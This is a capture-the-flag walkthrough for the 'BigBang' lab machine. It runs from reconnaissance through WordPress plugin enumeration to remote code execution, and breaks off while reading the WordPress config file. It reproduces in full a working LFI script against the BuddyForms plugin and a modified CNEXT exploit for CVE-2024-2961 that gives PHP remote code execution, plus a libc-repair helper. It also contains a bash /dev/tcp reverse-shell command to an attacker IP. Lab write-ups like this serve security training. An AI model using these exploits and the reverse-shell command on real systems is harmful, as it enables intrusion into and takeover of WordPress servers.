1, Recon
Port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
|_  256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Page check
![](images/Pasted%20image%2020250127180416.png)
By using whatweb, we can find some versions
```
whatweb http://blog.bigbang.htb/ 
http://blog.bigbang.htb/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.10.11.52], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], PHP[8.3.2], PasswordField[pwd], Script[importmap,module,text/html,text/javascript], Title[BigBang], UncommonHeaders[link], WordPress[6.5.4], X-Powered-By[PHP/8.3.2]
```
By using ffuf to fuzz the web-contents
```
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 12ms]
.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 12ms]
.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 2313ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 339ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 18ms]
wp-content              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 17ms]
wp-admin                [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 18ms]
wp-includes             [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 19ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 367ms]
                        [Status: 200, Size: 231897, Words: 10631, Lines: 2717, Duration: 552ms]
:: Progress: [4614/4614] :: Job [1/1] :: 32 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```
Then we can get the login page
![](images/Pasted%20image%2020250127181458.png)

We have known the service is powered by wordpress, so we can use wpscan to find something interesting here.
```
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://blog.bigbang.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2024-09-25T04:52:00.000Z
 | [!] The version is out of date, the latest version is 2.8.13
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt
```
The plugins `buddyforms 2.7.7` seems to be vulnerable
`BuddyForms <= 2.7.7 - PHAR Deserialization`
`https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/buddyforms/buddyforms-277-phar-deserialization`
There is a poc blog from `Joshua Martinelle`
`https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8`
We get the valid following payload
`phar%253a%252f%252f..%252fwp-content%252fuploads%252f2023%252f03%252fpayload.phar`
Then we can use that make a LFI exploit here.
```
LFI.py
import requests
import sys
import time
import json

if len(sys.argv) != 2:
    print("Usage: python LFI.py <file_to_read>")
    sys.exit(1)

file_to_read = sys.argv[1]

url = "http://blog.bigbang.htb/wp-admin/admin-ajax.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

data = (
    "action=upload_image_from_url&id=1&accepted_files=image/gif&url="
    f"php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource={file_to_read}"
)

try:
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        result = response.json()
        if result.get("status") == "OK":
            file_url = result.get("response")
            if file_url.endswith(".png"):
                print(f"PNG URL: {file_url}")
                try:
                    file_response = requests.get(file_url)
                    if file_response.status_code == 200:
                        print("File Contents:")
                        print(file_response.text)
                    else:
                        print(f"Failed to retrieve file. Status code: {file_response.status_code}")
                except Exception as e:
                    print(f"An error occurred while fetching the file: {e}")

        else:
            print("Error: Status is not OK")
    else:
        print(f"Error: Received status code {response.status_code}")

except Exception as e:
    print(f"An error occurred: {e}")
```

In this place, `http://blog.bigbang.htb/wp-content/uploads/` would be interesting here.
![](images/Pasted%20image%2020250129185318.png)

From `http://blog.bigbang.htb/?p=1`, we can check the valid user `root`
![](images/Pasted%20image%2020250129185643.png)
And there is a sample page from `http://blog.bigbang.htb/?page_id=2`
![](images/Pasted%20image%2020250129185729.png)
And there is a dashboard link `http://blog.bigbang.htb/wp-admin/`

There is another  `CVE-2024-2961`
```
CVE-2024-2961 是一个影响 GNU C 库（glibc）中 iconv() 函数的缓冲区溢出漏洞。该漏洞存在于 glibc 2.39 及更早版本中。 
KYLINOS.CN
因此，所有使用这些受影响 glibc 版本的系统都可能受到该漏洞的影响。为防止潜在的安全风险，建议将 glibc 升级至 2.40 或更高版本。

CVE-2024-2961 是一个存在于 glibc 库的 iconv() 函数中的缓冲区溢出漏洞。该漏洞自 2000 年起存在，影响所有使用受影响 glibc 版本的系统。在 PHP 环境中，如果 PHP 使用了受影响的 glibc 版本，并且应用程序调用了 iconv() 函数或使用了相关的字符集转换功能，可能会受到该漏洞的影响。因此，受影响的 PHP 版本并不取决于 PHP 本身的版本，而是取决于底层系统中 glibc 的版本。如果系统中的 glibc 版本存在该漏洞，那么在该系统上运行的所有 PHP 版本都有可能受到影响。

需要注意的是，成功利用该漏洞需要特定的前提条件，包括对输入和输出字符集的控制，以及对输入数据的部分控制。因此，虽然理论上所有使用受影响 glibc 版本的 PHP 环境都可能受到影响，但实际利用的可能性取决于具体的应用场景和代码实现。

POC:https://github.com/ambionics/cnext-exploits.git
Blog:https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
```

We need to change the exploit script, especially the class remote.
```
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
   
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
   
    The code here serves as an example that attacks a page that looks like:
   
    ```php
    <?php
   
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
   
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -> Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
       
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
       
        if 'File type' in file_path:
            print(file_path)
            return b''
       
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)->bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
       
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
           

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) > 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
       
        result = safe_download(path)
       
        if len(set(result).intersection(set(text))) == 0:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
       
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.7"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
           
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
           
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
           
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
           
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
           
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
       
        msg_print()
       
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
       
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```

When we use this exploit script, we would have some problems about the broken `libc.so.6` file because of the image type of this file.So we need to fixed that by using our own local machine's `libc.so.6` file
```
import os
import shutil

def extract_libc(png_path, output_path, start_offset, total_size):
    """
    Extract libc.so.6 data from a PNG file.
    """
    with open(png_path, 'rb') as png_file:
        # Read the exact number of bytes for libc.so.6
        png_file.seek(start_offset)
        extracted_data = png_file.read(total_size)
   
    with open(output_path, 'wb') as output_file:
        output_file.write(extracted_data)
   
    print(f"Extracted libc.so.6 data to {output_path}")
    print(f"Extracted size: {len(extracted_data)} bytes")

def append_valid_section_headers(libc_path, reference_libc_path):
    """
    Append valid section headers from a reference libc.so.6 to the extracted file.
    """
    with open(reference_libc_path, 'rb') as ref_file:
        ref_file.seek(section_headers_offset)
        section_headers_data = ref_file.read(total_section_headers_size)
   
    with open(libc_path, 'ab') as libc_file:
        libc_file.write(section_headers_data)
   
    print(f"Appended section headers from reference libc.so.6.")

# Paths to files
png_file_path = '1-40.png'
reference_libc_path = 'libc.so.6'
output_libc_path = 'libc.so.7'

# Known offsets and sizes
elf_start_offset = 9  # ELF header start offset in 1-40.png
section_headers_offset = 0x1D7278  # Section headers offset in reference libc.so.6
total_section_headers_size = 60 * 64  # 60 section headers, each 64 bytes
total_size = section_headers_offset + total_section_headers_size - elf_start_offset  # Full size of libc.so.6

# Step 1: Extract the main ELF data from 1-40.png
extract_libc(
    png_path=png_file_path,
    output_path=output_libc_path,
    start_offset=elf_start_offset,
    total_size=total_size
)

# Step 2: Append section headers from the reference libc.so.6
append_valid_section_headers(
    libc_path=output_libc_path,
    reference_libc_path=reference_libc_path
)

print(f"Fixed libc.so.6 saved to: {output_libc_path}")
```

So the final exploit process would be:
```
1, use LFI.py to check the target machine's libc.so.6, and store into the image file of http://blog.bigbang.htb/wp-content/uploads/2025/01/
curl http://blog.bigbang.htb/wp-content/uploads/2025/01/<your image> -o 1-40.png
cp /lib/x86_64-linux-gnu/libc.so.6 ./

2, use fixed.py to fix the target libc.so.6 file
python3 fixed.py
(You need to check the script and make all the libc.so.6 file and image file in the same dir, or changet the path of scirpt)

3,run the cnext exploit scirpt and open your netcat to handle the reverse shell
nc -nvlp 443
python3 cnext-exploit.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' 'bash -c "bash -i >& /dev/tcp/10.10.16.*/443 0>&1"'

Then you can get the reverse shell as www-data
```

Then we successfully get the shell as www-data
Then we can enumerate the config file `/var/www/html/wordpress/wp-config.php`
```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
